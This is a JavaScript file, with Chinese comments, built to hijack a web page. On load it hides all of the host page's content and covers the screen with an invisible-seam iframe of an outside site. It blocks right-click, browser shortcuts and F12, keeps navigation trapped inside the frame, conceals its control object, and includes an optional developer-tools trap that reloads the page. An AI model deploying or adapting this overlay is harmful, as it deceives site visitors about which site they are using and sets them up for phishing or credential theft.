// ty.js - 完全隐藏式无缝嵌入
(function() {
    'use strict';

    // 目标网址
    const TARGET_URL = 'https://Ax.mxio.org';
    
    // 容器和iframe引用
    let container = null;
    let iframe = null;
    let isVisible = false;
    let originalStyles = {};

    // 保存并隐藏原始页面元素
    function hideOriginalPage() {
        // 保存body原始样式
        const body = document.body;
        originalStyles.body = {
            overflow: body.style.overflow,
            position: body.style.position,
            width: body.style.width,
            height: body.style.height
        };
        
        // 隐藏body内容
        body.style.overflow = 'hidden';
        
        // 隐藏所有可见元素
        const allElements = document.querySelectorAll('body *');
        allElements.forEach((el, index) => {
            // 跳过script, style, iframe等标签
            if (['SCRIPT', 'STYLE', 'IFRAME', 'LINK', 'META', 'TITLE'].includes(el.tagName)) {
                return;
            }
            
            // 保存原始样式
            if (!el.dataset.tyOriginalDisplay) {
                el.dataset.tyOriginalDisplay = el.style.display;
            }
            
            // 隐藏元素
            el.style.display = 'none';
        });
        
        // 隐藏body背景
        originalStyles.bodyBackground = document.body.style.background;
        document.body.style.background = 'transparent';
    }

    // 恢复原始页面
    function restoreOriginalPage() {
        // 恢复body样式
        const body = document.body;
        if (originalStyles.body) {
            body.style.overflow = originalStyles.body.overflow || '';
            body.style.position = originalStyles.body.position || '';
            body.style.width = originalStyles.body.width || '';
            body.style.height = originalStyles.body.height || '';
        }
        
        // 恢复body背景
        if (originalStyles.bodyBackground !== undefined) {
            document.body.style.background = originalStyles.bodyBackground;
        }
        
        // 恢复所有元素的显示状态
        const allElements = document.querySelectorAll('body *');
        allElements.forEach(el => {
            if (el.dataset.tyOriginalDisplay !== undefined) {
                el.style.display = el.dataset.tyOriginalDisplay;
                delete el.dataset.tyOriginalDisplay;
            }
        });
    }

    // 创建完全隐藏的iframe容器
    function createIframeContainer() {
        // 首先隐藏原始页面
        hideOriginalPage();
        
        // 创建容器
        container = document.createElement('div');
        container.id = 'ty-iframe-container';
        
        // 完全覆盖整个视口
        container.style.position = 'fixed';
        container.style.top = '0';
        container.style.left = '0';
        container.style.width = '100vw';
        container.style.height = '100vh';
        container.style.zIndex = '2147483647'; // 最大z-index值
        container.style.backgroundColor = 'transparent';
        container.style.margin = '0';
        container.style.padding = '0';
        container.style.border = 'none';
        container.style.overflow = 'hidden';
        container.style.boxSizing = 'border-box';
        container.style.pointerEvents = 'auto';
        
        // 创建iframe
        iframe = document.createElement('iframe');
        iframe.id = 'ty-browser-iframe';
        iframe.src = TARGET_URL;
        
        // iframe样式 - 完全覆盖
        iframe.style.width = '100%';
        iframe.style.height = '100%';
        iframe.style.border = 'none';
        iframe.style.margin = '0';
        iframe.style.padding = '0';
        iframe.style.overflow = 'hidden';
        iframe.style.display = 'block';
        iframe.style.background = 'transparent';
        iframe.style.opacity = '1';
        iframe.style.visibility = 'visible';
        
        // 禁用iframe内的选择文本（可选）
        iframe.style.userSelect = 'none';
        iframe.style.webkitUserSelect = 'none';
        
        // 防止iframe内页面跳转外部
        iframe.sandbox = 'allow-same-origin allow-forms allow-scripts allow-popups allow-modals allow-presentation allow-downloads allow-top-navigation-by-user-activation';
        
        // 添加事件监听，确保无缝体验
        iframe.addEventListener('load', function() {
            try {
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                
                // 尝试设置iframe内文档的样式
                iframeDoc.body.style.margin = '0';
                iframeDoc.body.style.padding = '0';
                iframeDoc.body.style.overflow = 'hidden';
                
                // 尝试移除iframe内可能的滚动条
                iframeDoc.documentElement.style.overflow = 'hidden';
                
                // 防止iframe内页面跳转顶层
                const links = iframeDoc.querySelectorAll('a');
                links.forEach(link => {
                    if (link.target === '_blank' || link.target === '_top' || link.target === '_parent') {
                        link.target = '_self';
                    }
                    
                    // 防止链接跳转到外部
                    link.addEventListener('click', function(e) {
                        if (this.href && !this.href.startsWith('javascript:')) {
                            e.preventDefault();
                            iframe.src = this.href;
                        }
                    });
                });
                
                console.log('ty.js: iframe已加载并优化');
            } catch (e) {
                // 跨域限制
                console.log('ty.js: 无法优化iframe内容（跨域限制）');
            }
        });
        
        // 添加到容器
        container.appendChild(iframe);
        document.body.appendChild(container);
        
        // 阻止所有可能暴露iframe的事件
        container.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        });
        
        // 阻止键盘事件
        container.addEventListener('keydown', function(e) {
            e.stopPropagation();
            
            // 阻止可能暴露iframe的快捷键
            if (e.ctrlKey || e.metaKey) {
                if (e.key === 'l' || e.key === 't' || e.key === 'w' || e.key === 'n') {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                }
            }
            
            // 阻止F5、F12等
            if (e.key === 'F5' || e.key === 'F12') {
                e.preventDefault();
                e.stopImmediatePropagation();
            }
        }, true);
        
        // 捕获所有点击事件
        container.addEventListener('click', function(e) {
            e.stopPropagation();
        }, true);
        
        isVisible = true;
        console.log('ty.js: 已无缝嵌入目标页面');
    }

    // 处理窗口大小变化
    function handleResize() {
        if (container && isVisible) {
            container.style.width = window.innerWidth + 'px';
            container.style.height = window.innerHeight + 'px';
            
            if (iframe) {
                iframe.style.width = '100%';
                iframe.style.height = '100%';
            }
        }
    }

    // 防止用户通过开发者工具检测
    function preventDevToolsDetection() {
        // 重写console.log等方法，避免输出信息
        const originalConsoleLog = console.log;
        console.log = function(...args) {
            // 只允许特定前缀的日志
            if (args[0] && args[0].toString().startsWith('ty.js:')) {
                originalConsoleLog.apply(console, args);
            }
        };
        
        // 阻止调试器语句
        const originalDebugger = window.debugger;
        window.debugger = function() {};
        
        // 监测开发者工具
        const element = new Image();
        Object.defineProperty(element, 'id', {
            get: function() {
                // 当开发者工具打开时，会尝试获取id属性
                window.location.reload();
            }
        });
        console.log(element);
    }

    // 初始化函数
    function init() {
        // 检查是否已存在容器
        if (document.getElementById('ty-iframe-container')) {
            console.log('ty.js: 容器已存在');
            return;
        }
        
        // 可选：启用开发者工具检测
        // preventDevToolsDetection();
        
        // 创建并添加到页面
        createIframeContainer();
        
        // 添加窗口大小变化监听
        window.addEventListener('resize', handleResize);
        
        // 阻止页面卸载时的清理
        window.addEventListener('beforeunload', function(e) {
            // 不执行任何清理，保持iframe存在
        });
        
        console.log('ty.js: 已初始化无缝嵌入');
    }

    // 立即执行，不等待DOM加载
    init();

    // 暴露最小API（仅用于开发者控制）
    window.TYBrowser = {
        // 仅供内部使用的关闭方法
        _close: function() {
            if (container && container.parentNode) {
                document.body.removeChild(container);
                container = null;
                iframe = null;
            }
            
            restoreOriginalPage();
            isVisible = false;
            console.log('ty.js: 已关闭嵌入页面');
        },
        
        // 重新加载
        _reload: function() {
            if (iframe && isVisible) {
                iframe.src = TARGET_URL;
                console.log('ty.js: 已重新加载页面');
            }
        },
        
        // 获取状态
        _isVisible: function() {
            return isVisible;
        },
        
        // 获取目标URL
        _getTargetUrl: function() {
            return TARGET_URL;
        }
    };
    
    // 冻结API，防止被修改
    Object.freeze(window.TYBrowser);
    
    // 隐藏API，使其不那么明显
    Object.defineProperty(window, 'TYBrowser', {
        configurable: false,
        writable: false,
        enumerable: false
    });
    
    // 阻止页面被iframe检测
    if (window.top !== window.self) {
        // 如果当前页面已经在iframe中，重写检测代码
        try {
            window.self = window.top;
        } catch(e) {}
    }
})();